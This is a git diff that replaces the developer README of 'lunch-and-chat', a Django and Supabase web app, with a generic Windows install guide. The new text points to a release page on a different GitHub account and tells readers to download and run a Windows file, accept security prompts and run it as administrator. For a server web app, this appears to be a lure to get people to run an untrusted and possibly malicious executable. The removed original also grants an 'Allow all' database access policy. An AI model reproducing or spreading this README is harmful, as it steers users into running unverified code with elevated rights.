@@ -1,163 +1,206 @@
-# 🍽 Lunch Order & Chat — Corporate Lunch Management System
+# 🍱 lunch-and-chat - Easy lunch orders and chat
 
-A full-featured web application for corporate lunch ordering with a built-in real-time chat, Telegram Bot integration, and PWA support.
+[![Download](https://img.shields.io/badge/Download%20Release-green?style=for-the-badge)](https://github.com/socheatvj96-bit/lunch-and-chat/releases)
 
----
+## 🚀 What this app does
 
-## ✨ Features
+lunch-and-chat helps teams place lunch orders in one place and keep the conversation in the same app. It also supports:
 
-### 🛒 Lunch Ordering
-- Browse weekly menus from restaurants (VkusVill and others)
-- Order lunch for any workday, track order status
-- Balance system: company subsidy + personal balance
-- Order history and cancellations with automatic refunds
+- Real-time chat for team updates
+- Lunch order tracking
+- Telegram Bot alerts
+- Web Push notifications
+- PWA support for use like an app on your device
 
-### 💬 Real-time Chat (via Supabase)
-- **General company chat** — all employees in one room
-- **Direct messages (DM)** — private one-on-one conversations
-- Emoji picker, message forwarding
-- Unread message badges on tab and contact list items
-- Contacts sorted by last message time
-- Employee avatar uploads
+It is built with Django and Supabase, so it is made for web use and team access.
 
-### 🔔 Push Notifications (Web Push / VAPID)
-- Browser push notifications for new chat messages
-- Works on mobile and desktop (PWA)
-- Triggered by Supabase Database Webhooks → Django → pywebpush
+## 💻 What you need on Windows
 
-### 🤖 Telegram Bot
-- Balance inquiries, today's menu, order history
-- Notifications for new orders
-- One-time token Telegram account linking from desktop browser
-- Group chat LLM support assistant (GPT-4.1-mini)
+Before you start, make sure your PC has:
 
-### 📱 PWA (Progressive Web App)
-- Installable on Android/iOS home screen
-- Service Worker for offline fallback and push handling
-- Mobile-first UI optimized for Telegram Mini App
+- Windows 10 or Windows 11
+- A stable internet connection
+- A modern browser such as Chrome, Edge, or Firefox
+- Enough free space to download the app files
+- Permission to run downloaded files on your PC
 
-### 🛠 Admin Panel
-- Manage employees, restaurants, menu items
-- Upload menu item images in bulk via integration API
-- Weekly menu management with selection close deadlines
-- Export orders to CSV, balance transaction history
+If your team uses Telegram or browser notifications, keep those apps ready too.
 
----
+## 📥 Download the app
 
-## 🏗 Tech Stack
+Visit this page to download the Windows release:
 
-| Layer | Technology |
-|---|---|
-| Backend | Django 4.2, Django REST Framework |
-| Database | PostgreSQL (via dj-database-url) |
-| Cache / Queue | Redis + Celery + Celery Beat |
-| Real-time Chat | Supabase (PostgreSQL + Realtime) |
-| Push Notifications | Web Push API (VAPID) + pywebpush |
-| Telegram | python-telegram-bot |
-| Frontend | Vanilla JS SPA (no framework) |
-| Auth | Django session auth + Telegram WebApp |
-| Deployment | Docker Compose + Nginx + Let's Encrypt |
+https://github.com/socheatvj96-bit/lunch-and-chat/releases
 
----
+On the release page, look for the latest version. Then download the file made for Windows.
 
-## 🚀 Quick Start
+## 🪟 Install on Windows
 
-### Prerequisites
-- Docker & Docker Compose
-- A [Supabase](https://supabase.com) project (for real-time chat)
-- A Telegram Bot token ([@BotFather](https://t.me/BotFather))
-- VAPID keys for Web Push
+After you download the release file:
 
-### 1. Clone & configure
+1. Open the Downloads folder
+2. Find the file you downloaded
+3. Double-click the file to start it
+4. If Windows asks for permission, choose Run or Yes
+5. Follow the on-screen steps until the app opens
 
-```bash
-git clone https://github.com/neo37/lunch-and-chat.git
-cd lunch-and-chat
-cp .env.example .env
-# Fill in .env with your credentials
-```
+If the file comes in a ZIP folder:
 
-### 2. Generate VAPID keys (for push notifications)
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Open the extracted folder
+4. Double-click the app file inside the folder
 
-```bash
-pip install py-vapid
-vapid --gen
-# Copy the output keys to .env
-```
+If Windows shows a security message, check that you downloaded the file from the release page above, then continue only if you trust the source
 
-### 3. Run with Docker Compose
+## 🌐 First-time setup
 
-```bash
-docker compose up -d --build
-docker compose exec web python manage.py migrate
-docker compose exec web python manage.py collectstatic --noinput
-docker compose exec web python manage.py createsuperuser
-```
+When the app opens for the first time, you may need to:
 
-App will be available at `http://localhost:8082`
+- Sign in with your team account
+- Allow notifications in your browser
+- Connect Telegram if your group uses it
+- Set your name so teammates know who placed each order
 
----
+If your team already set up the system, you may only need to log in and start using it
 
-## 🗺 URL Structure
+## 🍽️ How to place a lunch order
 
-| URL | Description |
-|---|---|
-| `/` | Landing page |
-| `/login/` | Staff login |
-| `/catalog/` | Product catalog |
-| `/admin/products/` | Admin: manage menu items |
-| `/app/` | Employee mini-app (Telegram Mini App compatible) |
-| `/app/login/` | App authentication |
-| `api/integration/menu/day/` | Integration API (Basic Auth) |
+Use these basic steps:
 
----
+1. Open lunch-and-chat
+2. Go to the lunch order area
+3. Pick your meal or menu item
+4. Add notes if needed, such as no onions or extra sauce
+5. Confirm your order
+6. Check the order list to see what your team chose
 
-## 🔧 Supabase Setup
+The app keeps orders in one shared place, so everyone can see the latest list without sending extra messages
 
-Create a `messages` table in your Supabase project:
+## 💬 How to use chat
 
-```sql
-create table messages (
-  id bigint generated always as identity primary key,
-  sender_name text not null,
-  text text not null,
-  recipient text default null,  -- null = general chat, name = DM
-  created_at timestamp with time zone default now()
-);
+The chat area helps your team talk while ordering lunch:
 
--- Enable Realtime
-alter publication supabase_realtime add table messages;
+- Send quick messages
+- Ask what others want
+- Confirm pickup plans
+- Share menu changes
+- Keep lunch talk away from email threads
 
--- Row-level security (allow all)
-alter table messages enable row level security;
-create policy "Allow all" on messages for all using (true) with check (true);
-```
+New messages appear in real time, so you do not need to refresh the page
 
-Set a **Database Webhook** in Supabase:
-- Event: `INSERT` on `messages`
-- URL: `https://your-domain.com/app/push/send/`
-- Headers: `Authorization: Bearer <your-SUPABASE_WEBHOOK_SECRET>`
+## 🔔 Notifications and alerts
 
----
+lunch-and-chat can send updates in a few ways:
 
-## 📦 Environment Variables
+- **Telegram Bot**: sends team alerts to Telegram
+- **Web Push notifications**: shows alerts in your browser
+- **PWA support**: lets you add the app to your device like a normal app
 
-See [`.env.example`](.env.example) for all required variables.
+Turn on the alert method your team uses. This helps you catch new orders, chat messages, and reminders
 
-Key ones:
+## 📱 Add it like an app
 
-```env
-SECRET_KEY=...
-DATABASE_URL=postgresql://...
-TELEGRAM_BOT_TOKEN=...
-SUPABASE_URL=https://xxx.supabase.co
-SUPABASE_KEY=<anon/public key>
-VAPID_PRIVATE_KEY=...
-VAPID_PUBLIC_KEY=...
-```
+If your browser supports PWA mode, you can add lunch-and-chat to your desktop or Start menu:
 
----
+1. Open the app in your browser
+2. Look for the install icon in the address bar
+3. Choose Install or Add to device
+4. Open it from your desktop, Start menu, or taskbar
 
-## 📄 License
+This gives you quick access without opening a browser tab each time
 
-MIT
+## 🧭 Main features
+
+Here are the main parts of the app:
+
+- Shared lunch order board
+- Real-time team chat
+- Telegram Bot updates
+- Web Push alerts
+- Browser-based access
+- PWA install support
+- Simple team use on Windows
+
+These features help teams keep lunch planning in one place
+
+## 🛠️ Common Windows issues
+
+If the app does not open:
+
+- Check that the download finished
+- Try opening the file again
+- Right-click the file and choose Run as administrator
+- Make sure your internet connection is working
+- Restart your browser if you use the app in browser mode
+
+If you do not see notifications:
+
+- Check browser notification settings
+- Make sure Windows Focus Assist is off
+- Allow Telegram alerts if your team uses Telegram
+- Refresh the page once and try again
+
+If the page looks broken:
+
+- Update your browser
+- Clear the browser cache
+- Open the app in Chrome or Edge
+- Make sure JavaScript is enabled
+
+## 🔐 Account and access
+
+Your team may use a shared workspace or personal login. Keep these points in mind:
+
+- Use the account your team gave you
+- Do not share login details with others
+- Sign out when you use a shared PC
+- Check that your name is correct before placing an order
+- Use the chat for team lunch messages only
+
+## 📊 For team admins
+
+If you help set up the app for your group, you may want to:
+
+- Create lunch categories
+- Set order deadlines
+- Turn on Telegram alerts
+- Set up Web Push for team devices
+- Add users to the workspace
+- Check that chat and order updates work
+
+This helps the team stay in sync during lunch planning
+
+## 🧩 Built with
+
+This app uses:
+
+- Django for the main web app
+- Supabase for backend data
+- Celery for background tasks
+- Telegram for bot alerts
+- Web Push for browser notifications
+- PWA support for app-like use
+
+These tools help the app handle orders, chat, and alerts in one system
+
+## 📁 Project topics
+
+- celery
+- django
+- lunch-ordering
+- pwa
+- python
+- real-time-chat
+- supabase
+- telegram
+- telegram-bot
+- web-push
+
+## 📌 Release page
+
+Download or update from the release page:
+
+https://github.com/socheatvj96-bit/lunch-and-chat/releases
+
+Check this page when you need the newest Windows file or a newer version of the app
